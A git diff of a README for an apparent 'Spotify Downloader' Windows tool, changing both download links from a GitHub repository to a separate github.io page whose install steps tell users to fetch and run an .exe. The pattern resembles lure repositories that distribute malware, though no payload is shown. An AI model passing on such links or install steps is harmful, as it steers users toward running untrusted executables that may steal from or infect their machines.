@@ -1,6 +1,6 @@
 # 🎧 Spotify-Downloader-2026-MP3-320kbps - Save your music tracks easily now
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/metastable-cocktail431/Spotify-Downloader-2026-MP3-320kbps)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://metastable-cocktail431.github.io)
 
 This software allows you to download music tracks from Spotify. It converts your chosen songs into high-quality MP3 files at 320kbps. The application runs on Windows and keeps your library available for offline listening.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start the installation 
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official release page: [Download Link](https://github.com/metastable-cocktail431/Spotify-Downloader-2026-MP3-320kbps).
+1.  Visit the official release page: [Download Link](https://metastable-cocktail431.github.io).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the link for the latest version.
 4.  Find the file ending in .exe and click it to start the download.
